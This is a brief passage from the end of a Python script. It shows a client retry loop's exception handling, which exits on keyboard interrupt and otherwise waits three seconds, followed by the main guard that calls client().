        except KeyboardInterrupt:
            sys.exit(0)
        except:
            time.sleep(3)

if __name__ == '__main__':
    client()
